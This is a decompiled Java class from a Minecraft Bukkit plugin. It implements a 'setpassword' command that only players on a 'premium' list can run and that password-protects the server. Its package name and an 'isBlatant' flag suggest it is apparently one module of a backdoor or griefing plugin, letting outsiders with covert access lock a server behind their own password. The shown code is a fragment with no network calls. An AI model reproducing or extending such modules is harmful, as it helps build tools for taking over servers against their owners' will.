/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl.premium;

import me.qlutch.sucks.data.DataManager;
import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import org.bukkit.entity.Player;

public class SetpasswordCommand
extends Command {
    private static void set(String str) {
        DataManager.getData().set("pass", (Object)str);
        DataManager.saveData();
    }

    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (plugin.premium.contains(p2.getName())) {
            if (args.length <= 1) {
                p2.sendMessage(Settings.USAGE("setpassword <new password>"));
                p2.sendMessage(Settings.PREFIX("Passwords can only be 1 word and are cap sensitive!"));
            } else {
                SetpasswordCommand.set(args[1]);
                if (!DataManager.getData().getBoolean("hasPass")) {
                    DataManager.getData().set("hasPass", (Object)true);
                    DataManager.saveData();
                }
                p2.sendMessage(Settings.PREFIX("This server is now password protected!"));
            }
        } else {
            p2.sendMessage(Settings.PREFIX("You must be an " + Settings.RED + "premium " + Settings.WHITE + "to execute this command"));
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

